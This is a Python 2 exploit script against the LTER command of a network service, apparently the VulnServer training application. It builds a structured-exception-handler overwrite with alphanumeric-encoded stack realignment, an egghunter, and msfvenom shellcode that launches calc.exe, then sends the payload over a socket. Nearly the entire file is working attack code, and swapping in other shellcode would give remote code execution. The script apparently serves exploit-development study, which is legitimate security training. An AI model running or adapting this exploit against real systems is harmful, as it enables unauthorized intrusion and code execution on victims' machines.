#!/usr/bin/env python
import sys, socket, struct, time
 
if len(sys.argv) <= 2:
    print "Usage: python " + sys.argv[0] + " [host] [port]"
    exit()

host = sys.argv[1]    
port = int(sys.argv[2])

# Badchars
badchars = (
"\x00\x0a\x0d"
"\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )

# Egghunter ODOR
egghunt = "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x59\x55\x3d\x55\x2d\x71\x01\x01\x01\x2d\x6b\x6b\x6b\x6b\x2d\x56\x56\x56\x56\x50\x2d\x59\x06\x48\x5b\x2d\x06\x06\x67\x76\x2d\x5e\x5e\x5e\x5e\x2d\x09\x07\x08\x08\x50\x2d\x7c\x33\x79\x33\x2d\x71\x74\x67\x03\x2d\x2d\x2d\x2d\x2d\x2d\x51\x51\x51\x51\x50\x2d\x4a\x7b\x39\x7b\x2d\x48\x59\x3d\x6e\x2d\x4d\x4d\x4d\x4d\x2d\x76\x74\x74\x74\x50\x2d\x7d\x7d\x7d\x7d\x2d\x03\x03\x43\x25\x2d\x01\x01\x06\x06\x2d\x32\x32\x32\x32\x50\x2d\x37\x6d\x4d\x07\x2d\x31\x6c\x6c\x6c\x2d\x57\x57\x57\x57\x2d\x7b\x7c\x7b\x7a\x50\x2d\x6a\x49\x7c\x3e\x2d\x07\x4a\x7c\x03\x2d\x4a\x4a\x4a\x4a\x2d\x38\x38\x38\x38\x50\x2d\x5f\x5f\x3b\x5f\x2d\x06\x56\x06\x01\x2d\x3b\x02\x3d\x01\x2d\x09\x09\x09\x09\x50"

# Eggstring
egg = "ODOR"[::-1] * 2

# Shellcode
# msfvenom -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f python -b '\x00\x0a\x0d' exitfunc=seh -v shellcode bufferregister=eax
# Size 440 bytes
shellcode =  ""
shellcode += "\x50\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58"
shellcode += "\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42"
shellcode += "\x32\x42\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41"
shellcode += "\x42\x75\x4a\x49\x49\x6c\x38\x68\x4d\x52\x53\x30"
shellcode += "\x65\x50\x55\x50\x33\x50\x4f\x79\x6d\x35\x44\x71"
shellcode += "\x49\x50\x63\x54\x6e\x6b\x36\x30\x56\x50\x6c\x4b"
shellcode += "\x63\x62\x64\x4c\x6e\x6b\x70\x52\x36\x74\x6c\x4b"
shellcode += "\x74\x32\x34\x68\x34\x4f\x6e\x57\x32\x6a\x47\x56"
shellcode += "\x46\x51\x69\x6f\x4e\x4c\x65\x6c\x65\x31\x51\x6c"
shellcode += "\x73\x32\x46\x4c\x77\x50\x6f\x31\x6a\x6f\x64\x4d"
shellcode += "\x57\x71\x38\x47\x78\x62\x69\x62\x51\x42\x33\x67"
shellcode += "\x4e\x6b\x30\x52\x66\x70\x6c\x4b\x63\x7a\x67\x4c"
shellcode += "\x4e\x6b\x32\x6c\x37\x61\x74\x38\x59\x73\x31\x58"
shellcode += "\x55\x51\x38\x51\x72\x71\x4e\x6b\x76\x39\x65\x70"
shellcode += "\x77\x71\x38\x53\x4e\x6b\x72\x69\x66\x78\x69\x73"
shellcode += "\x55\x6a\x63\x79\x6e\x6b\x54\x74\x4e\x6b\x77\x71"
shellcode += "\x6b\x66\x35\x61\x59\x6f\x6e\x4c\x6b\x71\x48\x4f"
shellcode += "\x64\x4d\x36\x61\x4b\x77\x77\x48\x39\x70\x61\x65"
shellcode += "\x4b\x46\x67\x73\x51\x6d\x49\x68\x45\x6b\x53\x4d"
shellcode += "\x64\x64\x43\x45\x69\x74\x52\x78\x6e\x6b\x43\x68"
shellcode += "\x51\x34\x57\x71\x6a\x73\x63\x56\x6c\x4b\x54\x4c"
shellcode += "\x32\x6b\x6e\x6b\x76\x38\x35\x4c\x56\x61\x4a\x73"
shellcode += "\x4e\x6b\x73\x34\x6c\x4b\x37\x71\x6e\x30\x6f\x79"
shellcode += "\x57\x34\x35\x74\x47\x54\x43\x6b\x73\x6b\x63\x51"
shellcode += "\x33\x69\x43\x6a\x36\x31\x39\x6f\x6d\x30\x61\x4f"
shellcode += "\x61\x4f\x33\x6a\x6e\x6b\x45\x42\x48\x6b\x6c\x4d"
shellcode += "\x33\x6d\x53\x5a\x56\x61\x6c\x4d\x6f\x75\x58\x32"
shellcode += "\x33\x30\x73\x30\x55\x50\x66\x30\x63\x58\x50\x31"
shellcode += "\x6e\x6b\x62\x4f\x4f\x77\x4b\x4f\x7a\x75\x6d\x6b"
shellcode += "\x59\x6e\x46\x6e\x34\x72\x58\x6a\x63\x58\x69\x36"
shellcode += "\x6c\x55\x6f\x4d\x4d\x4d\x6b\x4f\x6e\x35\x65\x6c"
shellcode += "\x46\x66\x71\x6c\x77\x7a\x6d\x50\x59\x6b\x79\x70"
shellcode += "\x31\x65\x54\x45\x6d\x6b\x67\x37\x57\x63\x51\x62"
shellcode += "\x70\x6f\x50\x6a\x73\x30\x36\x33\x39\x6f\x6e\x35"
shellcode += "\x30\x63\x61\x71\x70\x6c\x65\x33\x36\x4e\x50\x65"
shellcode += "\x52\x58\x30\x65\x75\x50\x41\x41"

# Max length
maxlen = 6000

# Crash offsets
crash_ecx = 3555
crash_edx = crash_ecx - 4
crash_seh = 3535
crash_nseh = crash_seh - 4

# Return after jumping in NSEH
ret_nseh = 3407

# Stage2 length for placing shellcode
stage3len = 1700

# NOP's
fill = "A" * ret_nseh

# Clearing EAX
clear_eax = "\x25\x4A\x4D\x4E\x55"       # AND EAX, 0x554e4d4a
clear_eax += "\x25\x35\x32\x31\x2A"      # AND EAX, 0x2a313235

# ESP realignment
# 0x00ABFFC6 - 0x00ABF990 = 636
align_esp_s2 = ('\x54'                  # PUSH ESP
                '\x58'                  # POP EAX
                '\x66\x2d\x35\x06'      # SUB AX, 0x635
                '\x50'                  # PUSH EAX
                '\x5c')                 # POP ESP
                

align_esp_s1 = ('\x54'                  # PUSH ESP
                '\x58'                  # POP EAX
                '\x66\x05\x7f\x13'      # ADD AX,0x137f
                '\x04\x21'              # ADD AL,0x21
                '\x50'                  # PUSH EAX
                '\x5c')                 # POP ESP

# PUSH ESP # POP EAX # SUB EAX, 0x71D # JMP EAX
jmp_eax_s1 = "\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x41\x37\x37\x37\x2d\x69\x25\x25\x25\x2d\x72\x32\x49\x49\x2d\x5c\x5a\x5a\x5a\x50\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x2d\x04\x52\x04\x04\x2d\x41\x08\x5e\x7c\x2d\x4f\x4f\x4f\x4f\x2d\x4f\x4f\x4f\x4f\x50\x2d\x39\x04\x02\x39\x2d\x4f\x69\x55\x39\x2d\x08\x08\x08\x08\x2d\x39\x39\x39\x39\x50"

# Stage 3
# Egg and shellcode
stage3 = ""
stage3 += "A" * (stage3len - len(stage3))

# Stage 2
# Egghunter
stage2 = "B" * 8
stage2 += align_esp_s2
stage2 += egghunt
stage2 += "B" * (ret_nseh - len(stage2 + stage3))

# Stage 1
# Align ESP and JMP EAX
stage1 = align_esp_s1 + jmp_eax_s1
stage1 += "C" * (crash_nseh - len(stage1 + stage2 + stage3))

# After NSEH jump, returns at memory address 008AFF50
nseh = struct.pack("<L", 0xff774c4c)        # DEC ESP # DEC ESP # JNO 0x3 # Jumps 0x80 back on ESP, converts 0xff to 0x80 # Jumps 0x7E back
# nseh = struct.pack("<L", 0x4141ff74)        # JZ 0x1 # INC ECX # INC ECX  # Jumps 0x7E back
seh = struct.pack("<L", 0x6250120B)         # POP POP RET # 0x6250120B # essfunc.dll
suffix = "D" * (maxlen - len(stage3 + stage2 + stage1 + nseh + seh))

# Construct payload
payload = stage3 + stage2 + stage1 + nseh + seh + suffix

print "[+] Connecting to " + host + "\n"

try:
        req = (
                "LTER /.:/" +
                payload +
                "\r\n"
        )

        # Iterate functionalities for storing egg and shellcode in memory
        #for func in ["HELP", "GMON", "GDOG", "HTER", "LTER", "KSTAN"]:
        #    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #    s.settimeout(2)
        #    s.connect((host, port))
        #    egg_shell = func + " " + egg + shellcode
        #    print "[+] Sending egg and shellcode via " + func + " of " + str(len(egg_shell)) + " length message..."
        #    s.send(egg_shell)

        print "[+] Sending triggering payload of " + str(len(payload)) + " length message..."

        # Connect again, this time to send triggering payload    
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        s.connect((host, port))
        s.recv(1024)
        s.send(req)
        s.close()

        time.sleep(0.5)
    
except Exception,e:
        print "[!] Error occured: " + str(e)
        print "[*] Crashed occured at buffer length: " + str(len(payload))
        sys.exit()


